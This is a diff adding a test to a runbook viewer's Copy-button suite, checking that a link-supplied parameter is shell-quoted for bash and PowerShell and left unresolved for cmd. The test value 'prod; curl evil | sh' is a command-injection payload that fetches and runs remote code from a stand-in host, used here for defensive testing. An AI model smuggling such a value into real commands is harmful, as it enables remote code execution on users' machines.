@@ -91,4 +91,24 @@ describe('the line’s Copy button', () => {
     expect(Clipboard.setStringAsync).toHaveBeenLastCalledWith('curl -H "Authorization: ${secret:TOKEN}" https://prod.example.com');
     expect(screen.getByTestId('run-notice')).toHaveTextContent('Copied line 2, left as is: ${secret:TOKEN}');
   });
+
+  it('a value from a link stays one piece of text, quoted for the cell’s shell (security review round 3)', async () => {
+    const r = addRunbook(
+      'c.md',
+      '# C\n\n```bash\nkubectl -n ${param:NS} get pods\n```\n\n```powershell\nWrite-Output ${param:NS}\n```\n\n```cmd\necho ${param:NS}\n```\n',
+    );
+    setParamValue(r.id, 'NS', 'prod; curl evil | sh');
+    await render(<RunbookView id={r.id} />);
+    await press('cell-1-line-0');
+    await press('cell-1-line-0-copy');
+    expect(Clipboard.setStringAsync).toHaveBeenLastCalledWith("kubectl -n 'prod; curl evil | sh' get pods");
+    await press('cell-2-line-0');
+    await press('cell-2-line-0-copy');
+    expect(Clipboard.setStringAsync).toHaveBeenLastCalledWith("Write-Output 'prod; curl evil | sh'");
+    // cmd has no quoting that holds: the reference stays, and the notice says so.
+    await press('cell-3-line-0');
+    await press('cell-3-line-0-copy');
+    expect(Clipboard.setStringAsync).toHaveBeenLastCalledWith('echo ${param:NS}');
+    expect(screen.getByTestId('run-notice')).toHaveTextContent('Copied line 1, left as is: ${param:NS}');
+  });
 });
